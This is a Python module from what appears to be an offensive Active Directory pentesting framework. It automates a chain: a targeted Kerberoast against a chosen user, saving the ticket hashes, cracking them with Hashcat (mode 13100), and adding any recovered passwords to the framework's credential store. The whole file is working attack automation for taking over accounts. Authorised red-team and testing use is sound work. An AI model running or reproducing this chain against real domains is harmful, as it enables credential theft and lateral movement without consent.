def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_chain_artifacts_dir
    import argparse

    data, _ = load_current_profile()
    creds = get_all_creds(data)
    
    # Setup Paths
    target_user = args.extra[0] if args.extra else "unknown"
    artifacts = get_chain_artifacts_dir(data["name"], f"targeted_kb_{target_user}")
    
    hashes_file = artifacts / "hashes.txt"
    cracked_file = artifacts / "cracked.txt"

    # ---------------- STEP 1: Targeted Kerberoast ----------------
    print(f"[*] Step 1: Performing Targeted Kerberoast against {target_user}...")
    
    # We call the module and get the list back
    extracted_hashes = run_module_by_name("ad.targeted_kerberoast", [target_user], data)
    print(extracted_hashes)
    if not extracted_hashes:
        print(f"[-] Failed to extract hashes for {target_user}")
        return

    # Save hashes to artifacts
    hashes_file.write_text("\n".join(extracted_hashes) + "\n")
    print(f"[+] Hashes saved to {hashes_file}")

    # ---------------- STEP 2: Crack ----------------
    if not getattr(args, "auto", False):
        if not input(f"[?] Attempt to crack hash for {target_user}? (Y/n): ").lower() in ["", "y"]:
            return

    print(f"[*] Step 2: Cracking hash with Hashcat...")
    run_module_by_name("crack.hash", [
        str(hashes_file),
        "--mode", "13100",
        "--out", str(cracked_file),
        "--quiet"
    ], data)

    # ---------------- STEP 3: Import ----------------
    if cracked_file.exists() and cracked_file.stat().st_size > 0:
        print("[*] Step 3: Importing cracked credential...")
        new_creds = run_module_by_name("parse.hash", [str(cracked_file)], data)
        
        if new_creds:
            from core.target import target_add_cred
            for c in new_creds:
                target_add_cred(argparse.Namespace(
                    user=c["user"],
                    password=c["secret"],
                    hash=None, aes=None, ccache=None
                ))
    else:
        print("[-] No password recovered.")

    print(f"\n-------- Targeted Kerberoast ({target_user}) Complete --------")